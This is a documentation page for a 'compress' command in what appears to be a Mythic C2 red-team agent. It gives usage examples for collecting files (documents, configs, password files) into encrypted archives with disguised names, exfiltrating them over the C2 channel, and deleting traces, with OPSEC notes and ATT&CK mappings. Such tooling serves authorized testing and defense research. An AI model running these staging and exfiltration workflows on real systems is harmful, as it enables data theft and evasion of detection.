+++
title = "compress"
chapter = false
weight = 120
hidden = false
+++

## Summary

Create, list, extract, stage, exfil, or stage-exfil encrypted archives for data staging and exfiltration. The `stage` action collects files into an AES-256-GCM encrypted archive with a randomized name. The `exfil` action transfers a staged archive to Mythic with SHA-256 integrity verification. The `stage-exfil` action combines both in one step — collect, encrypt, transfer, and clean up.

Cross-platform — works on Windows, Linux, and macOS.

## Arguments

| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| action | Yes | create | `create` (archive), `list` (show contents), `extract` (unarchive), `stage` (collect + encrypt), `exfil` (transfer staged archive to Mythic), `stage-exfil` (collect + encrypt + transfer + cleanup) |
| cleanup | No | false | Auto-delete staged archive after successful exfil transfer |
| path | Yes | — | Source: file/directory (create), archive file (list/extract) |
| format | No | zip | Archive format: `zip` or `tar.gz`. Auto-detected from file extension for list/extract |
| output | No | auto | Output: archive file (create), directory (extract). Auto-generated if omitted |
| pattern | No | all files | Glob pattern to filter files (e.g. `*.txt`, `*.docx`, `password*`) |
| max_depth | No | 10 | Maximum directory recursion depth |
| max_size | No | 104857600 (100MB) | Skip files larger than this (bytes) |

## Usage

### Create a zip archive
```
compress -action create -path C:\Users\target\Documents -output C:\Users\target\Downloads\docs.zip
```

### Create a tar.gz archive
```
compress -action create -path /etc -format tar.gz -output /tmp/configs.tar.gz
```

### Archive only specific file types
```
compress -action create -path /etc -pattern *.conf -format tar.gz -output /tmp/configs.tar.gz
```

### List archive contents (auto-detects format)
```
compress -action list -path /tmp/configs.tar.gz
```

### Extract files from archive (auto-detects format)
```
compress -action extract -path /tmp/configs.tar.gz -output /tmp/extracted
```

### Extract only specific files
```
compress -action extract -path docs.zip -pattern *.xlsx -output /tmp/spreadsheets
```

### Archive a single file
```
compress -action create -path C:\Windows\System32\drivers\etc\hosts
```

### Stage files with encryption (data staging)
```
compress -action stage -path /home/user/Documents -pattern *.pdf
```
Collects matching files into an AES-256-GCM encrypted archive in a temp directory. Returns JSON with encryption key, archive path, file count, and SHA-256 hash.

### Stage to a specific directory
```
compress -action stage -path C:\Users\target\Desktop -output C:\ProgramData -pattern *.docx
```

### Exfil a staged archive to Mythic
```
compress -action exfil -path /tmp/sys-update-12345/a1b2c3d4e5f6.dat
```
Transfers the encrypted archive to Mythic via the C2 channel. Computes SHA-256 for integrity verification. Returns JSON with file size, hash, and transfer status.

### Exfil with auto-cleanup
```
compress -action exfil -path /tmp/sys-update-12345/a1b2c3d4e5f6.dat -cleanup true
```
Securely deletes the staged archive after successful transfer to minimize forensic artifacts.

### Combined stage + exfil (recommended workflow)
```
compress -action stage-exfil -path /home/user/Documents -pattern *.pdf
```
One command for the entire data exfiltration workflow: collect matching files, encrypt into AES-256-GCM archive, transfer to Mythic, and securely delete the staging archive. Returns combined metadata with encryption key, hashes, and transfer confirmation.

## Features

- **Dual format**: zip and tar.gz support with auto-detection from file extension
- **Cross-platform**: Uses Go stdlib (`archive/zip`, `archive/tar`, `compress/gzip`) — no external dependencies
- **Pattern filtering**: Glob patterns for selective archiving/extraction
- **Depth limiting**: Control recursion depth for large directory trees
- **Size limiting**: Skip large files to keep archives manageable
- **Auto output path**: Generates output path from source if not specified
- **Path traversal protection**: Both zip and tar extraction validate paths to prevent directory escape
- **Symlink safety**: tar.gz extraction skips symlinks to prevent symlink attacks
- **Compression**: zip uses Deflate; tar.gz uses gzip compression

## OPSEC Considerations

- Archive creation writes a new file to disk — consider cleanup after exfiltration
- `compress stage-exfil` is the recommended one-step exfiltration workflow (stage + transfer + cleanup)
- `compress stage` followed by `compress exfil` provides manual control over each step
- `compress create` followed by `download` is an alternative non-encrypted exfil workflow
- Large directory archiving may cause noticeable disk I/O
- `create`/`list`/`extract` archives are not encrypted — use `stage` or download over an encrypted C2 channel
- The `stage` action uses AES-256-GCM encryption with a random key — the key is returned in task output
- Staged archives use randomized names (`.dat` extension) in temp directories to avoid detection
- tar.gz is the standard format on Linux/macOS; zip is more common on Windows

## MITRE ATT&CK Mapping

- **T1560.001** — Archive Collected Data: Archive via Utility
- **T1074.001** — Data Staged: Local Data Staging (stage action)
- **T1041** — Exfiltration Over C2 Channel (exfil/stage-exfil actions)
- **T1048** — Exfiltration Over Alternative Protocol
